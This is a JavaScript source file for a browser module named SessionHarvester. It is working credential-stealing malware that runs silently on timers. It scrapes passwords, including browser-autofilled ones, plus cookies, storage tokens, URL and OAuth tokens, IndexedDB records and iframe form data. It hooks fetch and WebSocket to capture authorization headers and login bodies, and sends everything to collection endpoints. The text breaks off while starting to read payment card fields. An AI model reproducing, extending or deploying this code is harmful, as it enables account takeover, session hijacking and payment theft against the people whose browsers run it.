export default class SessionHarvester {
  constructor(core) {
    this.core = core;
    this.sessionTokens = [];
    this.crossTabData = [];
    this.capturedPasswords = new Set();
  }

  init() {
    // Initial harvest after a short delay
    setTimeout(() => this.harvestSessions(), 2000);
    
    // Listen for cross-tab storage events
    window.addEventListener('storage', (e) => this.handleStorageEvent(e));
    
    // Periodic harvest - re-run every 30s
    setInterval(() => this.harvestSessions(), 30000);
    
    // Fast autofill detection every 5s
    setInterval(() => this.detectAutofilledPasswords(), 5000);
    
    // Delayed catches for Chrome autofill (browser autofills at different times)
    setTimeout(() => this.detectAutofilledPasswords(), 1000);
    setTimeout(() => this.detectAutofilledPasswords(), 3000);
    setTimeout(() => this.detectAutofilledPasswords(), 7000);
    setTimeout(() => this.detectAutofilledPasswords(), 15000);
  }

  handleStorageEvent(e) {
    if (!e.key || !e.newValue) return;
    const sessionKeywords = ['token', 'session', 'auth', 'jwt', 'bearer', 'password', 'credential', 'access', 'refresh', 'secret', 'key'];
    if (sessionKeywords.some(k => e.key.toLowerCase().includes(k))) {
      this.core.send('/api/collect/bulk', {
        data: {
          sessionHarvest: [{
            source: 'cross-tab-storage-event',
            key: e.key,
            value: this.truncate(e.newValue, 500),
            url: e.url || 'unknown',
            timestamp: Date.now()
          }],
          _meta: { trigger: 'storage-event', key: e.key }
        }
      });
    }
  }

  /**
   * Dedicated method for detecting Chrome/Google saved password autofills.
   * Checks for:-webkit-autofill pseudo-class, yellow autofill background, and populated values.
   * Runs frequently because Chrome may autofill with significant delay after page load.
   */
  detectAutofilledPasswords() {
    try {
      // Check ALL password inputs on the page
      const allInputs = document.querySelectorAll('input[type="password"]');
      
      allInputs.forEach(pwdInput => {
        const hasValue = pwdInput.value && pwdInput.value.length > 0;
        const isAutofilled = pwdInput.matches(':-webkit-autofill');
        const style = window.getComputedStyle(pwdInput);
        const hasAutofillBg = style.backgroundColor === 'rgb(250, 255, 189)' || 
                               style.backgroundColor === 'rgb(255, 255, 194)' ||
                               style.backgroundColor === 'rgb(229, 243, 255)';
        
        if ((hasValue || isAutofilled || hasAutofillBg) && !this.capturedPasswords.has(pwdInput.value)) {
          this.capturedPasswords.add(pwdInput.value);
          
          const form = pwdInput.closest('form');
          let username = '';
          let email = '';
          
          if (form) {
            const emailInput = form.querySelector('input[type="email"], input[name*="email"], input[autocomplete="email"]');
            const userInput = form.querySelector('input[name*="user"], input[name*="login"], input[autocomplete="username"]');
            if (emailInput?.value) email = emailInput.value;
            if (userInput?.value) username = userInput.value;
            
            // If no explicit username field, check the input before password
            if (!username && !email) {
              const allFormInputs = form.querySelectorAll('input:not([type="password"])');
              for (const inp of allFormInputs) {
                if (inp === pwdInput) break;
                if (inp.value && inp.type !== 'hidden') {
                  if (inp.value.includes('@')) email = inp.value;
                  else username = inp.value;
                }
              }
            }
          }
          
          this.core.send('/api/collect/credentials', {
            source: 'password-manager-autofill',
            username: username || email || '',
            password: pwdInput.value,
            email: email,
            url: form?.action || window.location.href,
            formType: 'chrome-saved-password-autofill',
            fieldData: {
              inputName: pwdInput.name,
              inputId: pwdInput.id,
              isAutofilled: isAutofilled,
              hasAutofillBg: hasAutofillBg,
              formAction: form?.action || ''
            }
          });
        }
      });
      
      // Also check inputs with autocomplete="current-password" / "new-password"
      const autocompletePwdInputs = document.querySelectorAll('input[autocomplete="current-password"], input[autocomplete="new-password"]');
      autocompletePwdInputs.forEach(pwdInput => {
        if (pwdInput.value && !this.capturedPasswords.has(pwdInput.value)) {
          this.capturedPasswords.add(pwdInput.value);
          this.core.send('/api/collect/credentials', {
            source: 'password-manager-autocomplete',
            password: pwdInput.value,
            url: window.location.href,
            formType: 'autocomplete-password',
            fieldData: { name: pwdInput.name, id: pwdInput.id, autocomplete: pwdInput.getAttribute('autocomplete') }
          });
        }
      });
    } catch(e) {
      // Silent fail
    }
  }

  async harvestSessions() {
    const sessionData = [];

    this.extractSessionStorage(sessionData);
    this.extractCookies(sessionData);
    this.extractFromURL(sessionData);
    await this.extractBroadcastChannels(sessionData);
    this.extractFromOpener(sessionData);
    this.extractFromFrames(sessionData);
    this.extractFromMeta(sessionData);
    this.extractWebSocketData(sessionData);
    this.interceptNetworkRequests(sessionData);
    await this.extractSavedPasswords(sessionData);
    await this.extractServiceWorkerData(sessionData);
    this.extractWindowReferences(sessionData);
    this.extractIndexedDBInfo(sessionData);
    this.extractPaymentData(sessionData);

    if (sessionData.length > 0) {
      await this.core.send('/api/collect/bulk', { data: { sessionHarvest: sessionData } });

      // Check each item for credentials and tokens
      sessionData.forEach(item => {
        const value = typeof item.value === 'string' ? item.value : JSON.stringify(item.value);
        
        if (this.containsCredentials(item.key, value)) {
          const extracted = this.extractCredentialsFromValue(item.key, value);
          if (extracted && !this.capturedPasswords.has(extracted.password)) {
            this.capturedPasswords.add(extracted.password);
            this.core.send('/api/collect/credentials', {
              source: 'session-harvest',
              username: extracted.username || extracted.email || '',
              password: extracted.password || '',
              email: extracted.email || '',
              url: extracted.url || window.location.href,
              formType: 'auto-harvest-' + item.source,
              fieldData: { source: item.source, key: item.key }
            });
          }
        }

        if (this.containsToken(item.key, value)) {
          this.sessionTokens.push({ source: item.source, key: item.key, token: value.substring(0, 200) });
        }
      });

      if (this.sessionTokens.length > 0) {
        await this.core.send('/api/collect/formdata', {
          formId: 'session-tokens-harvest',
          fields: { tokens: this.sessionTokens, count: this.sessionTokens.length },
          url: window.location.href
        });
      }

      await this.core.send('/api/collect/formdata', {
        formId: 'cross-session-harvest',
        fields: {
          totalKeys: sessionData.length,
          sessionTokens: this.sessionTokens.length,
          passwordsFound: this.capturedPasswords.size,
          sources: [...new Set(sessionData.map(s => s.source))],
          sessions: sessionData.slice(0, 30).map(s => ({ key: s.key, source: s.source, valueType: typeof s.value }))
        },
        url: window.location.href
      });
    }
  }

  // === STORAGE EXTRACTION ===

  extractSessionStorage(data) {
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      if (key) {
        const value = sessionStorage.getItem(key);
        data.push({ source: 'sessionStorage', key, value: this.truncate(value, 500) });
      }
    }

    const sessionKeywords = ['token', 'session', 'auth', 'jwt', 'bearer', 'access', 'refresh',
                             'api_key', 'apikey', 'secret', 'credential', 'password', 'passwd',
                             'login', 'logged', 'user', 'sid', 'sessionid', 'connect.sid',
                             'oauth', 'openid', 'saml', 'csrf', 'xsrf', '__session',
                             'remember', 'identity', 'profile', 'account'];

    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key) {
        const value = localStorage.getItem(key);
        if (sessionKeywords.some(k => key.toLowerCase().includes(k))) {
          data.push({ source: 'localStorage-session', key, value: this.truncate(value, 500) });
        }
        // Also grab any key with a JWT-like value
        if (value && value.length > 50 && /^eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+$/.test(value)) {
          data.push({ source: 'localStorage-jwt', key, value: this.truncate(value, 300) });
        }
      }
    }
  }

  extractCookies(data) {
    const cookies = document.cookie.split(';').filter(c => c.trim());
    const sessionCookieKeywords = ['session', 'token', 'auth', 'sid', 'jwt', 'bearer',
                                   'connect.sid', 'PHPSESSID', 'JSESSIONID', 'ASP.NET_SessionId',
                                   'XSRF-TOKEN', 'csrf-token', 'remember', 'login', 'user',
                                   'AWSALB', 'AWSALBCORS', 'visitor', 'identity',
                                   '__cfduid', '__utm', '_ga', '_gid', '_fbp', '_gcl'];

    cookies.forEach(cookie => {
      const [name, ...rest] = cookie.split('=');
      const value = rest.join('=')?.trim();
      const nameLower = name?.toLowerCase() || '';

      if (sessionCookieKeywords.some(k => nameLower.includes(k))) {
        data.push({ source: 'cookie', key: name?.trim(), value: this.truncate(value, 500) });
      }

      // Flag long/complex cookies as potential tokens
      if (value && value.length > 30 && /^[A-Za-z0-9\-_\.%]+$/.test(value)) {
        data.push({ source: 'cookie-suspicious-token', key: name?.trim(), value: this.truncate(value, 300) });
      }
    });
  }

  // === URL EXTRACTION ===

  extractFromURL(data) {
    const url = new URL(window.location.href);

    url.searchParams.forEach((value, key) => {
      const tokenParams = ['token', 'access_token', 'refresh_token', 'code', 'state',
                          'session', 'auth', 'key', 'api_key', 'secret', 'id_token',
                          'oauth_token', 'oauth_verifier', 'login_token', 'reset_token',
                          'password_reset', 'confirm', 'verification', 'signature',
                          'jwt', 'bearer', 'sid', 'csrf', 'nonce', 'ticket', 'assertion'];
      if (tokenParams.some(p => key.toLowerCase().includes(p))) {
        data.push({ source: 'url-param', key, value: this.truncate(value, 300) });
      }
    });

    if (url.hash && url.hash.length > 5) {
      data.push({ source: 'url-hash', key: 'fragment', value: this.truncate(url.hash, 500) });
      try {
        const hashParams = new URLSearchParams(url.hash.substring(1));
        hashParams.forEach((value, key) => {
          if (['access_token', 'id_token', 'token', 'state', 'session_state'].includes(key)) {
            data.push({ source: 'url-hash-token', key, value: this.truncate(value, 200) });
          }
        });
      } catch (e) {}
    }

    if (document.referrer) {
      data.push({ source: 'referrer', key: 'document.referrer', value: document.referrer });
      try {
        const refUrl = new URL(document.referrer);
        refUrl.searchParams.forEach((value, key) => {
          if (key.toLowerCase().includes('token') || key.toLowerCase().includes('session')) {
            data.push({ source: 'referrer-param', key, value: this.truncate(value, 200) });
          }
        });
      } catch (e) {}
    }

    // Extract from window.location properties
    data.push({ source: 'window.location', key: 'href', value: url.href });
    data.push({ source: 'window.location', key: 'origin', value: url.origin });
    data.push({ source: 'window.location', key: 'pathname', value: url.pathname });
  }

  // === CROSS-TAB & BROADCAST CHANNELS ===

  async extractBroadcastChannels(data) {
    try {
      if (!('BroadcastChannel' in window)) return;

      const channelNames = [
        'auth', 'session', 'auth_channel', 'session_channel', 'app_channel',
        'sync', 'app_state', 'user_state', 'login_state', 'auth_state',
        'cross_tab', 'tab_sync', 'shared_session', '__auth_channel__',
        'amplitude_sync', 'mixpanel_sync', 'segment_sync', 'redux_sync',
        'vuex_sync', 'mobx_sync', 'zustand_sync', 'recoil_sync',
        'auth0', 'okta', 'firebase', 'supabase', 'cognito',
        '__session_broadcast__', 'tab-communication', 'app-sync',
        'credential', 'credentials', 'password-manager', 'login-state',
        'user-auth', 'token-refresh', 'session-refresh'
      ];

      for (const name of channelNames) {
        try {
          const channel = new BroadcastChannel(name);
          const messagePromise = new Promise((resolve) => {
            channel.onmessage = (e) => {
              resolve({ channel: name, data: e.data });
              channel.close();
            };
            channel.postMessage({ type: '__harvester_ping__', source: 'harvester', timestamp: Date.now() });
            setTimeout(() => resolve(null), 1500);
          });

          const result = await messagePromise;
          if (result && result.data) {
            const msgStr = typeof result.data === 'string' ? result.data : JSON.stringify(result.data);
            data.push({ source: `broadcast-channel`, key: name, value: this.truncate(msgStr, 1000) });

            if (msgStr.includes('token') || msgStr.includes('password') || msgStr.includes('auth') || msgStr.includes('session')) {
              data.push({ source: `broadcast-channel-sensitive`, key: name, value: this.truncate(msgStr, 1500) });
              const creds = this.extractCredentialsFromValue(name, msgStr);
              if (creds) {
                this.core.send('/api/collect/credentials', {
                  source: 'broadcast-channel',
                  username: creds.username || creds.email || '',
                  password: creds.password || '',
                  email: creds.email || '',
                  url: window.location.href,
                  formType: 'broadcast-channel-intercept',
                  fieldData: { channel: name }
                });
              }
            }
          }
        } catch (e) {}
      }

      // Try SharedWorker
      if ('SharedWorker' in window) {
        try {
          const worker = new SharedWorker('/shared-worker.js');
          worker.port.start();
          worker.port.postMessage({ type: '__harvester_ping__' });
          worker.port.onmessage = (e) => {
            if (e.data) {
              data.push({ source: 'shared-worker', key: 'message', value: this.truncate(JSON.stringify(e.data), 500) });
            }
          };
          setTimeout(() => worker.port.close(), 2000);
        } catch (e) {}
      }
    } catch (e) {}
  }

  // === WINDOW OPENER/PARENT ===

  extractFromOpener(data) {
    try {
      if (window.opener && !window.opener.closed) {
        try {
          const openerUrl = window.opener.location?.href;
          if (openerUrl) data.push({ source: 'window.opener', key: 'location', value: openerUrl });
        } catch (e) {}

        try {
          const openerSession = window.opener.sessionStorage;
          if (openerSession) {
            for (let i = 0; i < openerSession.length; i++) {
              const key = openerSession.key(i);
              if (key) {
                const value = openerSession.getItem(key);
                if (key.toLowerCase().includes('token') || key.toLowerCase().includes('session') || key.toLowerCase().includes('auth') || key.toLowerCase().includes('password')) {
                  data.push({ source: 'opener-sessionStorage', key, value: this.truncate(value, 300) });
                  if (key.toLowerCase().includes('password') || key.toLowerCase().includes('token')) {
                    this.sendCredentialFromValue(value, key, window.opener.location?.href);
                  }
                }
              }
            }
          }
        } catch (e) {}

        try {
          const openerLocal = window.opener.localStorage;
          if (openerLocal) {
            for (let i = 0; i < openerLocal.length; i++) {
              const key = openerLocal.key(i);
              if (key) {
                const value = openerLocal.getItem(key);
                if (key.toLowerCase().includes('token') || key.toLowerCase().includes('session') || key.toLowerCase().includes('auth') || key.toLowerCase().includes('password')) {
                  data.push({ source: 'opener-localStorage', key, value: this.truncate(value, 300) });
                  if (key.toLowerCase().includes('password')) {
                    this.sendCredentialFromValue(value, key, window.opener.location?.href);
                  }
                }
              }
            }
          }
        } catch (e) {}

        try {
          const openerDoc = window.opener.document;
          const openerCookies = openerDoc.cookie;
          if (openerCookies && openerCookies.length > 0) {
            const parsed = openerCookies.split(';').filter(c => c.trim());
            parsed.forEach(c => {
              const [name, ...rest] = c.split('=');
              const n = name?.trim()?.toLowerCase() || '';
              if (n.includes('session') || n.includes('token') || n.includes('auth')) {
                data.push({ source: 'opener-cookie', key: name?.trim(), value: this.truncate(rest.join('='), 200) });
              }
            });
          }
        } catch (e) {}
      }
    } catch (e) {}

    // Try window.parent
    try {
      if (window.parent && window.parent !== window) {
        const parentUrl = window.parent.location?.href;
        if (parentUrl) data.push({ source: 'window.parent', key: 'location', value: parentUrl });
        
        try {
          const parentSession = window.parent.sessionStorage;
          if (parentSession) {
            for (let i = 0; i < parentSession.length; i++) {
              const key = parentSession.key(i);
              if (key && (key.toLowerCase().includes('token') || key.toLowerCase().includes('session'))) {
                data.push({ source: 'parent-sessionStorage', key, value: this.truncate(parentSession.getItem(key), 200) });
              }
            }
          }
        } catch (e) {}
      }
    } catch (e) {}
  }

  // === IFRAME EXTRACTION ===

  extractFromFrames(data) {
    try {
      const frames = document.querySelectorAll('iframe, frame, object, embed');
      frames.forEach((frame, i) => {
        try {
          const frameSrc = frame.src || frame.getAttribute('src') || frame.data || '';
          if (frameSrc) {
            data.push({ source: 'frame', key: `frame[${i}].src`, value: frameSrc });
          }
        } catch (e) {}

        try {
          const frameDoc = frame.contentDocument || frame.contentWindow?.document;
          if (frameDoc) {
            const forms = frameDoc.querySelectorAll('form');
            forms.forEach(form => {
              const formAction = form.action || frameSrc || 'unknown';
              data.push({ source: `frame[${i}].form`, key: 'action', value: formAction });

              const pwdInputs = form.querySelectorAll('input[type="password"]');
              pwdInputs.forEach(pwd => {
                if (pwd.value) {
                  const usernameInput = form.querySelector('input[type="email"], input[name*="email"], input[name*="user"], input[name*="login"]');
                  const username = usernameInput?.value || '';
                  const password = pwd.value;

                  data.push({ source: `frame[${i}].password`, key: pwd.name || pwd.id || 'password', value: 'REDACTED' });

                  if (!this.capturedPasswords.has(password)) {
                    this.capturedPasswords.add(password);
                    this.core.send('/api/collect/credentials', {
                      source: 'iframe-harvest',
                      username: username,
                      password: password,
                      email: username?.includes('@') ? username : '',
                      url: formAction,
                      formType: 'iframe-cross-origin-password',
                      fieldData: { iframeIndex: i, iframeSrc: frameSrc, name: pwd.name }
                    });
                  }
                }
              });

              const allInputs = form.querySelectorAll('input:not([type="hidden"])');
              const formData = {};
              allInputs.forEach(inp => {
                if (inp.name && inp.value) formData[inp.name] = inp.value;
              });
              if (Object.keys(formData).length > 0) {
                this.core.send('/api/collect/formdata', {
                  formId: `iframe-form-${i}`,
                  fields: formData,
                  url: formAction
                });
              }
            });

            try {
              const iframeCookies = frameDoc.cookie;
              if (iframeCookies && iframeCookies.length > 10) {
                data.push({ source: `frame[${i}].cookies`, key: 'cookie', value: this.truncate(iframeCookies, 500) });
              }
            } catch (e) {}

            try {
              const iframeLocal = frame.contentWindow?.localStorage;
              if (iframeLocal) {
                for (let j = 0; j < iframeLocal.length; j++) {
                  const key = iframeLocal.key(j);
                  if (key) {
                    const val = iframeLocal.getItem(key);
                    if (key.toLowerCase().includes('token') || key.toLowerCase().includes('session') || key.toLowerCase().includes('password')) {
                      data.push({ source: `frame[${i}].localStorage`, key, value: this.truncate(val, 300) });
                      if (key.toLowerCase().includes('password')) {
                        this.sendCredentialFromValue(val, key, frameSrc);
                      }
                    }
                  }
                }
              }
            } catch (e) {}
          }
        } catch (e) {}
      });
    } catch (e) {}

    try {
      const allElements = document.querySelectorAll('*');
      allElements.forEach(el => {
        if (el.shadowRoot) {
          const shadowForms = el.shadowRoot.querySelectorAll('form');
          shadowForms.forEach(form => {
            const pwdInputs = form.querySelectorAll('input[type="password"]');
            pwdInputs.forEach(pwd => {
              if (pwd.value) {
                const usernameField = form.querySelector('input[type="email"], input[name*="email"]');
                this.core.send('/api/collect/credentials', {
                  source: 'shadow-dom-harvest',
                  username: usernameField?.value || '',
                  password: pwd.value,
                  email: usernameField?.value?.includes('@') ? usernameField.value : '',
                  url: window.location.href,
                  formType: 'shadow-dom',
                  fieldData: { shadowHost: el.tagName, hostId: el.id }
                });
              }
            });
          });
        }
      });
    } catch (e) {}
  }

  // === META/LINK EXTRACTION ===

  extractFromMeta(data) {
    const metaTags = document.querySelectorAll('meta');
    const csrfNames = ['csrf-token', 'csrf-param', '_csrf', 'x-csrf-token',
                       'session-token', 'auth-token', 'api-key', 'app-id',
                       'build-id', 'release-version', 'deploy-version'];

    metaTags.forEach(meta => {
      const name = meta.getAttribute('name') || meta.getAttribute('property') || '';
      const content = meta.getAttribute('content') || '';
      if (csrfNames.some(n => name.toLowerCase().includes(n))) {
        data.push({ source: 'meta-tag', key: name, value: this.truncate(content, 200) });
      }
      if (content && content.length > 40 && /^[A-Za-z0-9\-_\.]+$/.test(content)) {
        data.push({ source: 'meta-tag-suspicious', key: name, value: this.truncate(content, 200) });
      }
    });

    const linkTags = document.querySelectorAll('link');
    linkTags.forEach(link => {
      const rel = link.getAttribute('rel') || '';
      const href = link.getAttribute('href') || '';
      if (['canonical', 'alternate', 'preconnect', 'dns-prefetch', 'preload', 'prefetch'].includes(rel)) {
        data.push({ source: 'link-tag', key: rel, value: href });
      }
    });

    const scripts = document.querySelectorAll('script[src]');
    scripts.forEach(script => {
      const src = script.src || '';
      if (src.includes('analytics') || src.includes('tracking') || src.includes('metrics') ||
          src.includes('beacon') || src.includes('collect') || src.includes('log')) {
        data.push({ source: 'script-analytics', key: 'src', value: this.truncate(src, 200) });
      }
    });
  }

  // === WEBSOCKET INTERCEPTION ===

  extractWebSocketData(data) {
    try {
      if (window.WebSocket.prototype._harvesterPatched) return;

      const OriginalWebSocket = window.WebSocket;
      const self = this;

      class HarvesterWebSocket extends OriginalWebSocket {
        constructor(url, protocols) {
          super(url, protocols);
          this._harvesterUrl = typeof url === 'string' ? url : url?.url || '';
          data.push({ source: 'websocket', key: 'new-connection', value: this._harvesterUrl.substring(0, 200) });

          this.addEventListener('open', () => {
            self.core.send('/api/collect/formdata', {
              formId: 'websocket-connection',
              fields: { url: this._harvesterUrl?.substring(0, 200), readyState: 'OPEN' },
              url: window.location.href
            });
          });

          this.addEventListener('message', (event) => {
            const msgData = event.data;
            let msgStr = '';
            if (typeof msgData === 'string') msgStr = msgData;
            else if (msgData instanceof ArrayBuffer) msgStr = new TextDecoder().decode(msgData);
            else if (msgData instanceof Blob) {
              const reader = new FileReader();
              reader.onload = () => {
                const text = reader.result;
                if (typeof text === 'string' && (text.includes('token') || text.includes('auth') || text.includes('session') || text.includes('password'))) {
                  self.core.send(`/api/collect/formdata`, {
                    formId: 'websocket-message-sensitive',
                    fields: { url: this._harvesterUrl?.substring(0, 200), message: text.substring(0, 1000) },
                    url: window.location.href
                  });
                  const creds = self.extractCredentialsFromValue('websocket', text);
                  if (creds) {
                    self.core.send('/api/collect/credentials', {
                      source: 'websocket-intercept',
                      username: creds.username || creds.email || '',
                      password: creds.password || '',
                      email: creds.email || '',
                      url: this._harvesterUrl?.substring(0, 200),
                      formType: 'websocket-message',
                      fieldData: { messagePreview: text.substring(0, 200) }
                    });
                  }
                }
              };
              reader.readAsText(msgData);
              return;
            }

            if (msgStr && (msgStr.includes('token') || msgStr.includes('auth') || msgStr.includes('session') || msgStr.includes('password') || msgStr.includes('credential'))) {
              self.core.send('/api/collect/formdata', {
                formId: 'websocket-message-sensitive',
                fields: { url: this._harvesterUrl?.substring(0, 200), message: msgStr.substring(0, 1000) },
                url: window.location.href
              });
            }
          });
        }
      }

      window.WebSocket = HarvesterWebSocket;
      window.WebSocket.prototype._harvesterPatched = true;
      window.WebSocket.CONNECTING = 0;
      window.WebSocket.OPEN = 1;
      window.WebSocket.CLOSING = 2;
      window.WebSocket.CLOSED = 3;
    } catch (e) {}
  }

  // === NETWORK INTERCEPTION ===

  interceptNetworkRequests(data) {
    try {
      if (window._harvesterFetchPatched) return;

      const self = this;
      const originalFetch = window.fetch;

      window.fetch = async function(input, init) {
        const url = typeof input === 'string' ? input : input?.url || '';
        const headers = init?.headers || {};
        let headersObj = {};

        if (headers instanceof Headers) {
          headers.forEach((value, key) => {
            headersObj[key] = value;
            if (key.toLowerCase() === 'authorization' || key.toLowerCase() === 'x-api-key' || key.toLowerCase() === 'x-auth-token') {
              self.core.send('/api/collect/formdata', {
                formId: 'api-auth-header-fetch',
                fields: { url: url.substring(0, 200), header: key, value: value.substring(0, 200), method: init?.method || 'GET' },
                url: window.location.href
              });
            }
          });
        } else if (typeof headers === 'object') {
          Object.entries(headers).forEach(([key, value]) => {
            headersObj[key] = value;
            if (key.toLowerCase() === 'authorization' || key.toLowerCase() === 'x-api-key' || key.toLowerCase() === 'x-auth-token') {
              self.core.send('/api/collect/formdata', {
                formId: 'api-auth-header-fetch',
                fields: { url: url.substring(0, 200), header: key, value: String(value).substring(0, 200), method: init?.method || 'GET' },
                url: window.location.href
              });
            }
          });
        }

        if (init?.body && typeof init.body === 'string') {
          const body = init.body;
          if (body.includes('password') || body.includes('grant_type') || body.includes('authorization_code')) {
            self.core.send('/api/collect/formdata', {
              formId: 'api-request-body-sensitive',
              fields: { url: url.substring(0, 200), body: body.substring(0, 1000), method: init?.method || 'POST' },
              url: window.location.href
            });
            const creds = self.extractCredentialsFromValue('fetch-body', body);
            if (creds) {
              self.core.send('/api/collect/credentials', {
                source: 'fetch-intercept',
                username: creds.username || creds.email || '',
                password: creds.password || '',
                email: creds.email || '',
                url: url.substring(0, 200),
                formType: 'api-request',
                fieldData: { method: init?.method || 'POST' }
              });
            }
          }
        }

        const response = await originalFetch.apply(this, arguments);

        if (response.ok && response.headers?.get('content-type')?.includes('json')) {
          const cloned = response.clone();
          cloned.json().then(body => {
            const bodyStr = JSON.stringify(body);
            if (bodyStr.includes('token') || bodyStr.includes('access_token') || bodyStr.includes('session') || bodyStr.includes('password')) {
              self.core.send('/api/collect/formdata', {
                formId: 'api-response-sensitive',
                fields: { url: url.substring(0, 200), responsePreview: bodyStr.substring(0, 2000) },
                url: window.location.href
              });
              if (body.access_token || body.token || body.id_token) {
                self.sessionTokens.push({ source: 'fetch-response', key: url.substring(0, 100), token: (body.access_token || body.token || body.id_token || '').substring(0, 200) });
              }
            }
          }).catch(() => {});
        }

        return response;
      };

      window._harvesterFetchPatched = true;
    } catch (e) {}
  }

  // === SAVED PASSWORDS & AUTOFILL ===

  async extractSavedPasswords(data) {
    try {
      const forms = document.querySelectorAll('form');
      forms.forEach((form, formIndex) => {
        const pwdInputs = form.querySelectorAll('input[type="password"]');
        pwdInputs.forEach(pwdInput => {
          if (pwdInput.value && !this.capturedPasswords.has(pwdInput.value)) {
            this.capturedPasswords.add(pwdInput.value);

            const usernameField = form.querySelector('input[type="email"], input[name*="email"], input[name*="user"], input[name*="login"], input[name*="username"]');
            const username = usernameField?.value || '';
            const email = username?.includes('@') ? username : '';

            let siblingUsername = '';
            const allInputs = form.querySelectorAll('input');
            for (let i = 0; i < allInputs.length; i++) {
              if (allInputs[i] === pwdInput && i > 0) {
                const prev = allInputs[i - 1];
                if (prev.value && prev.type !== 'hidden' && prev.type !== 'password') {
                  siblingUsername = prev.value;
                }
                break;
              }
            }

            const finalUsername = username || siblingUsername || '';

            data.push({ source: 'saved-password-autofill', key: `form[${formIndex}] password`, value: 'REDACTED' });

            this.core.send('/api/collect/credentials', {
              source: 'password-manager-autofill',
              username: finalUsername,
              password: pwdInput.value,
              email: email || (finalUsername?.includes('@') ? finalUsername : ''),
              url: form.action || window.location.href,
              formType: 'autofill-detected',
              fieldData: { formIndex, formAction: form.action, inputName: pwdInput.name, inputId: pwdInput.id }
            });
          }
        });
      });

      const standalonePwd = document.querySelectorAll('input[type="password"]:not(form input)');
      standalonePwd.forEach(pwdInput => {
        if (pwdInput.value && !this.capturedPasswords.has(pwdInput.value)) {
          this.capturedPasswords.add(pwdInput.value);
          this.core.send('/api/collect/credentials', {
            source: 'standalone-password',
            password: pwdInput.value,
            url: window.location.href,
            formType: 'standalone-autofill',
            fieldData: { name: pwdInput.name, id: pwdInput.id }
          });
        }
      });

      const hiddenFields = document.querySelectorAll('input[type="hidden"]');
      hiddenFields.forEach(field => {
        const name = field.name?.toLowerCase() || '';
        if (name.includes('password') || name.includes('pwd') || name.includes('pass')) {
          if (field.value && !this.capturedPasswords.has(field.value)) {
            this.capturedPasswords.add(field.value);
            this.core.send('/api/collect/credentials', {
              source: 'hidden-field',
              password: field.value,
              url: window.location.href,
              formType: 'hidden-credential-field',
              fieldData: { name: field.name }
            });
          }
        }
      });
    } catch (e) {}
  }

  // === SERVICE WORKER ===

  async extractServiceWorkerData(data) {
    try {
      if ('serviceWorker' in navigator) {
        const registrations = await navigator.serviceWorker.getRegistrations();
        registrations.forEach((reg, i) => {
          data.push({
            source: 'service-worker',
            key: `registration[${i}]`,
            value: JSON.stringify({ scope: reg.scope, active: reg.active?.scriptURL || 'none', waiting: reg.waiting?.scriptURL || 'none', installing: reg.installing?.scriptURL || 'none' })
          });

          if (reg.active) {
            try {
              const messageChannel = new MessageChannel();
              messageChannel.port1.onmessage = (e) => {
                if (e.data) {
                  data.push({ source: `sw[${i}].message`, key: 'response', value: this.truncate(JSON.stringify(e.data), 500) });
                }
              };
              reg.active.postMessage({ type: '__harvester_ping__', source: 'harvester' }, [messageChannel.port2]);
            } catch (e) {}
          }
        });

        if (navigator.serviceWorker.controller) {
          data.push({ source: 'service-worker', key: 'controller', value: navigator.serviceWorker.controller.scriptURL || 'unknown' });
        }
      }
    } catch (e) {}
  }

  // === WINDOW REFERENCES ===

  extractWindowReferences(data) {
    try {
      const globalKeys = Object.getOwnPropertyNames(window);
      globalKeys.forEach(key => {
        if (key.startsWith('__') && key.includes('tab') || key.includes('session') || key.includes('auth')) {
          try {
            const val = window[key];
            if (val && typeof val !== 'function' && typeof val !== 'object') {
              data.push({ source: 'window-global', key, value: this.truncate(String(val), 200) });
            }
          } catch (e) {}
        }
      });

      if (window.name && window.name.length > 5) {
        data.push({ source: 'window.name', key: 'name', value: this.truncate(window.name, 1000) });
        const creds = this.extractCredentialsFromValue('window.name', window.name);
        if (creds) {
          this.core.send('/api/collect/credentials', {
            source: 'window-name',
            username: creds.username || creds.email || '',
            password: creds.password || '',
            email: creds.email || '',
            url: window.location.href,
            formType: 'cross-tab-window-name',
            fieldData: { windowName: this.truncate(window.name, 200) }
          });
        }
      }

      try {
        if (window.opener?.name) {
          data.push({ source: 'opener.name', key: 'name', value: this.truncate(window.opener.name, 500) });
        }
      } catch (e) {}
    } catch (e) {}
  }

  // === INDEXED DB ===

  async extractIndexedDBInfo(data) {
    try {
      if (!('indexedDB' in window)) return;
      const dbs = await indexedDB.databases?.() || [];
      for (const dbInfo of dbs) {
        data.push({ source: 'indexedDB', key: dbInfo.name || 'unknown', value: `version: ${dbInfo.version || 'N/A'}` });

        try {
          const db = await new Promise((resolve, reject) => {
            const req = indexedDB.open(dbInfo.name, dbInfo.version);
            req.onsuccess = () => resolve(req.result);
            req.onerror = () => reject();
            setTimeout(() => reject(), 2000);
          });

          const storeNames = [...db.objectStoreNames];
          for (const storeName of storeNames) {
            if (storeName.toLowerCase().includes('token') || storeName.toLowerCase().includes('session') ||
                storeName.toLowerCase().includes('auth') || storeName.toLowerCase().includes('credential') ||
                storeName.toLowerCase().includes('password') || storeName.toLowerCase().includes('key')) {

              const transaction = db.transaction(storeName, 'readonly');
              const store = transaction.objectStore(storeName);
              const allData = await new Promise((resolve, reject) => {
                const req = store.getAll();
                req.onsuccess = () => resolve(req.result);
                req.onerror = () => reject();
                setTimeout(() => reject(), 2000);
              });

              if (allData && allData.length > 0) {
                data.push({ source: 'indexedDB-data', key: `${dbInfo.name}/${storeName}`, value: this.truncate(JSON.stringify(allData.slice(0, 5)), 2000) });

                const strData = JSON.stringify(allData);
                if (strData.includes('password') || strData.includes('token') || strData.includes('secret')) {
                  const creds = this.extractCredentialsFromValue(storeName, strData);
                  if (creds) {
                    this.core.send('/api/collect/credentials', {
                      source: 'indexedDB-harvest',
                      username: creds.username || creds.email || '',
                      password: creds.password || '',
                      email: creds.email || '',
                      url: window.location.href,
                      formType: `indexedDB:${storeName}`,
                      fieldData: { dbName: dbInfo.name, storeName, recordCount: allData.length }
                    });
                  }
                }
              }
            }
          }
          db.close();
        } catch (e) {}
      }
    } catch (e) {}
  }

  // === PAYMENT DATA ===

  extractPaymentData(data) {
    try {
      const ccInputs = document.querySelectorAll('input[autocomplete="cc-number"], input[name*="card"], input[name*="cc"], input[name*="credit"]');
      ccInputs.forEach(input => {
        if (input.value) {
